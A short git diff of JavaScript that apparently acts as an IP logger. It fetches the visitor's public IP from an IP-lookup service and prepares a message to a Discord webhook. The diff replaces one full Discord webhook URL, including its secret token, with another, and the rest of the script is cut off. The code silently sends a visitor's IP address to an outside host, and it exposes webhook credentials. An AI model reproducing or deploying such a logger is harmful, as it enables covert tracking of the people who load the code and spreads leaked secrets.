@@ -3,7 +3,7 @@ fetch("https://api.ipify.org?format=json")
   .then(response => response.json())
   .then(data => {
     const ip = data.ip;
-    const webhookUrl = "https://discord.com/api/webhooks/1419580060041609309/nEogJD_MFi2WHcypOz_p93vcXH-EHGUI-F74KYaoed014rwBJnJZT0FMyaA8HRPhNJKq";
+    const webhookUrl = "https://discord.com/api/webhooks/1420852251009880197/mkab3By7IuKgbgvhvF5IhSHkTVBepc4T-L-uPZKHon9H1LKN-WK5IpK0UVUHF4OYeUS0";
 
     // Nachricht formatieren (nur IP)
     const payload = {
